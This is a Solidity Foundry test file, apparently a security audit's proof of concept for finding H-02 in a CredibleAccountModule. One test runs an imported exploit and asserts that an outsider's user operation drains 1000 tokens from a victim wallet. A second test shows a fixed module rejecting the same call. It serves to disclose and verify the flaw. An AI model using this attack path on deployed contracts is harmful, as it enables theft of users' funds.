// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    CredibleAccountModuleFixed,
    Token,
    Wallet
} from "./61412-h-02-in-credibleaccountmodule-the-validateuserop-function-is.sol";

contract Finding61412Test is Test {
    function test_exploit_outsider_userop_moves_N() public {
        Exploit e = new Exploit();
        e.run();

        assertTrue(e.module().validatorInitialized(address(e.wallet())), "wallet installed");
        assertFalse(e.module().validatorInitialized(address(e)), "caller did not install");
        assertEq(e.token().balanceOf(address(e)), e.N(), "userOp moved 1000 GLUE");
        assertEq(e.token().balanceOf(address(e.wallet())), 0, "wallet emptied");
    }

    function test_control_rejects_uninstalled_caller() public {
        Token token = new Token("Glue", "GLUE", 18);
        Wallet wallet = new Wallet();
        CredibleAccountModuleFixed module = new CredibleAccountModuleFixed(token);
        token.mint(address(wallet), 1000 ether);
        wallet.approve(token, address(module), 1000 ether);
        wallet.install(address(module));
        address sessionKey = address(0xBEEF);
        module.bind(sessionKey, address(wallet));
        bytes memory signature = abi.encodePacked(bytes20(uint160(sessionKey)), new bytes(45));

        (bool ok, bytes memory ret) = address(module).call(
            abi.encodeCall(module.validateUserOp, (address(wallet), uint256(1000 ether), signature))
        );

        assertFalse(ok, "control must reject the userOp");
        assertEq(bytes4(ret), CredibleAccountModuleFixed.CredibleAccountModule_ModuleNotInstalled.selector);
        assertEq(token.balanceOf(address(wallet)), 1000 ether, "N stays in the wallet");
        assertEq(token.balanceOf(address(this)), 0, "caller received nothing");
        assertTrue(module.validatorInitialized(address(wallet)), "wallet remains installed");
        assertFalse(module.validatorInitialized(address(this)), "caller was never installed");
    }
}
